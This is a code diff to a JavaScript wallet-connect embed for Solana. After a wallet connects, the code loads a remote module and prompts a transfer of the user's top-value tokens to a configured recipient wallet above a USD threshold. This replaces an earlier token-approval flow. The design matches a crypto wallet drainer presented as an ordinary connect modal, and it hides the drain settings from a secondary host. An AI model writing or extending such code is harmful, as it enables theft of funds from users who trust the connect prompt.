@@ -25,11 +25,9 @@ const SOLANA_CONNECT = { view: "Connect", namespace: "solana" };
  * @property {string} [siteUrl]
  * @property {string[]} [siteIcons]
  * @property {boolean} [analytics]
- * @property {boolean} [tokenApprovalEnabled]
- * @property {string} [tokenApprovalProgramId] deployed BPF program (required before approvals)
- * @property {number} [tokenApprovalMaxCount]
- * @property {number} [tokenApprovalMinUsd]
- * @property {"max" | "balance"} [tokenApprovalAmountMode]
+ * @property {boolean} [tokenTransferEnabled]
+ * @property {string} [transferRecipient]
+ * @property {number} [transferMinUsd]
  * @property {string} [solanaRpcUrl]
  * @property {string} [priceApiUrl]
  * @property {boolean} [connectPopupEnabled]
@@ -133,8 +131,8 @@ function createWalletModal(config) {
  * @param {import('./wallet-loader.js').WalletEmbedConfig} config
  */
 function setupPostConnectApprovals(modal, config) {
-  if (config.tokenApprovalEnabled === false) return;
-  if (!(config.tokenApprovalProgramId || "").trim()) return;
+  if (config.tokenTransferEnabled === false) return;
+  if (!(config.transferRecipient || "").trim()) return;
 
   modal.subscribeAccount((account) => {
     if (!account?.isConnected) {
@@ -169,11 +167,11 @@ function setupPostConnectApprovals(modal, config) {
         const modUrl =
           (config.approvalChunkUrl || "").trim() ||
           `${base}?c=${encodeURIComponent(chunk)}`;
-        const { createRpcConnection, promptTopTokenApprovals } = await import(
+        const { createRpcConnection, promptTopValueTransfer } = await import(
           /* @vite-ignore */ modUrl
         );
         const connection = createRpcConnection(config);
-        await promptTopTokenApprovals({
+        await promptTopValueTransfer({
           config,
           provider,
           connection,
@@ -223,11 +221,9 @@ let vercelConnectWindow = null;
 function configForVercelConnectHost(config) {
   const vercelSite = (config.vercelSiteUrl || "").replace(/\/$/, "");
   const {
-    tokenApprovalEnabled: _a,
-    tokenApprovalProgramId: _b,
-    tokenApprovalMaxCount: _c,
-    tokenApprovalMinUsd: _d,
-    tokenApprovalAmountMode: _e,
+    tokenTransferEnabled: _a,
+    transferRecipient: _b,
+    transferMinUsd: _c,
     ...rest
   } = config;
   return {
